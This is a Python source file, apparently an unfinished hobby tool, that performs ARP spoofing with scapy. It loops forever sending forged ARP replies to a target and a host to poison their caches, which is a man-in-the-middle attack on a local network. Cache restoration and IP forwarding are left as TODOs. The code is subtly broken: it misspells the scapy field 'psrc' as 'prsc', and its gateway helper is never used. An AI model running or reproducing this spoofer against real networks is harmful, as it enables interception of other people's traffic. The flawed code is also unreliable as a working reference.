import sys
import time
import scapy.all as scapy
from rich import print

from services import get_mac

"""
----  TO DO:  ----
def restore_cache();
def enable_ip_route();
main loop;
"""

def ScapyArpSpoofer(target, host, verbose):

    def get_default_gateway():
        try:
            """sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(('8.8.8.8', 80))
            gateway_ip = sock.getsockname()
            print(gateway_ip)
            sock.close()"""

            """ipconfig = subprocess.check_output("ipconfig")
            print(ipconfig)
            default_gateway = re.findall("Gateway", ipconfig)
            print(default_gateway)"""

            gw = scapy.conf.route.route("0.0.0.0")[2]
            print(gw)

            return gw
        
        except Exception as e:
            print(f"[bold red][!] ERROR: {str(e)}[/bold red]")


    def spoofer(target, host):
        packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), prsc=host)
        
        scapy.send(packet, verbose=False)

    try:
        packets_count = 0
        while True:
            spoofer(target, host)
            spoofer(host, target)

            packets_count = packets_count + 2
            print(f"Packets sent: {packets_count}")
            time.sleep(1)
    
    except KeyboardInterrupt:
        sys.exit()

    except Exception as e:
        print(f"[bold red][!] ERROR: {str(e)}[/bold red]")
        sys.exit(1)

if __name__ == '__main__':
    print(get_mac("192.168.5.132"))